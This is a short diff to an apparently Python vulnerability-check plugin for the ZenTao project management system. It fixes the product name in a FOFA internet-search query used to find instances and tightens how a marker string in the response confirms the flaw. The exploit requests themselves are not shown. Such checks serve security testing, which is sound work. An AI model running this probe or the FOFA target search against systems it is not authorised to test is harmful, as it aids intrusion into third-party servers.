@@ -30,7 +30,7 @@ class POC(POCBase):
         """,                                # 漏洞简要描述
 
         "fofa-dork":"""
-            app="易企天创-禅道系统"
+            app="易软天创-禅道系统"
         """,                     # fofa搜索语句
         "example" : "",                     # 存在漏洞的演示url，写一个就可以了
         "exp_img" : "",                      # 先不管  
@@ -78,7 +78,7 @@ class POC(POCBase):
                     req2 = requests.get(url2,headers = headers , proxies = self.proxy ,timeout = 20,verify = False)
                     
                     req3 = requests.get(url3,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-                    if req3.status_code == 200 and "zeOnFtaXo" in req3.text:#zeOnFtaXo
+                    if req3.status_code == 200 and "zeOnFtaXo" == req3.text.strip():#zeOnFtaXo
                         vuln = [True,req3.text]
                     # req2 = requests.get(url2,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
                     
